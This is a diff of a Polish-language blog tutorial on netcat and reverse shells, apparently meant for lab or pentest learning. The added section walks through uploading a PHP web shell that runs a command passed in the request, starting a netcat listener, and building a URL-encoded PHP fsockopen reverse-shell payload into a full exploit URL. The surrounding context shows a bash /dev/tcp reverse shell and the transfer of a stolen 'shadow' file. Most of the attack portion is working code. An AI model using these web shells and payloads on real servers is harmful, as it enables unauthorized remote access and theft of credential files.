@@ -298,10 +298,7 @@ bash -i &> /dev/tcp/172.16.1.89/1337 0>&1
 ```
 # Co jeszcze mogę zrobić z Nc?
 ## Wysyłanie plików
-Możesz przerzucić plik i tutaj polecam **Nc** w wersji **OpenBSD** w ten sposób:
-```bash
-nc -nlktp 8001 -c "nc 127.0.0.1 8000"
-```
+Możesz przerzucić plik - akurat tutaj polecam **Nc** w wersji **OpenBSD** - w ten sposób:
 {: .text-justify}
 ### Przejęta maszyna 
 Jak już wcześniej wspomniałem przełącznik _-N_ działa tylko na **Nc** z **OpenBSD**. Po przesłaniu pliku program sam kończy prace. Niestety w przypadku innego - tradycyjnego, z pakietu _nmap_ - trzeba po wysłaniu pliku, wcisnąć _ctrl+c_ aby zakończyć.
@@ -317,11 +314,46 @@ Connection to 172.16.1.89 1337 port [tcp/menandmice-dns] succeeded!
 nc -lvnp 1337 > shadow
 ```
 ## Przekierowanie portów
-Tak, tutaj też można użyć **Nc**, chociaż najlepiej się do tego nadaje **Socat**. Poniżej przykład użycia.
+Tak, tutaj też można użyć **Nc**, chociaż najlepiej się do tego nadaje **Socat**. Poniżej przykład użycia:
 {: .text-justify}
 ```bash
 nc -nlktp 8001 -c "nc 127.0.0.1 8000"
 ```
+# PHP
+Załóżmy, że mamy dostęp do jakiegoś serwera, np. o ip **172.16.1.123** gdzie możemy wrzucać pliki z rozszerzeniem _php_ **(http://server/uploads/)**. Naszym celem jest połączyć się stamtąd na naszą maszynę. Można to zrobić w ten sposób:
+{: .text-justify}
+## shell.php
+Należy stworzyć plik _shell.php_:
+{: .text-justify}
+```php
+<?php
+echo shell_exec($_REQUEST['cmd']);
+?>
+```
+## Nasłuchiwanie
+Włączamy jak zwykle u siebie nasłuchiwanie:
+{: .text-justify}
+```bash
+nc -lvp 1337
+```
+## Payload
+Przygotowujemy **payload**:
+{: .text-justify}
+```bash
+php -r '$sock=fsockopen("172.16.1.89",1337);exec("bash <&3 >&3 2>&3");'
+```
+Konwertujemy na format _URL_. Można to zrobić na stronie [urlencoder](https://www.urlencoder.org/). Wychodzi coś takiego:
+{: .text-justify}
+```bash
+php%20-r%20%27%24sock%3Dfsockopen%28%22172.16.1.89%22%2C1337%29%3Bexec%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
+```
+Doklejamy **payload** do do naszego linku:
+{: .text-justify}
+```bash
+http://172.16.1.123/uploads/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22172.16.1.89%22%2C1337%29%3Bexec%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
+```
+Jezeli wszystko przebiegło poprawnie powinniśmy mieć dostęp do **Shella**.
+{: .text-justify}
 # Koniec
 I to już koniec. Mam nadzieję, że wyjaśniłem trochę sprawę. Na koniec Bonus w postaci [linka](https://www.revshells.com/) do generatora **Shelli**. Jeżeli masz coś ciekawego do dodania, lub znalazłeś poważny błąd, daj znać.
 {: .text-justify}
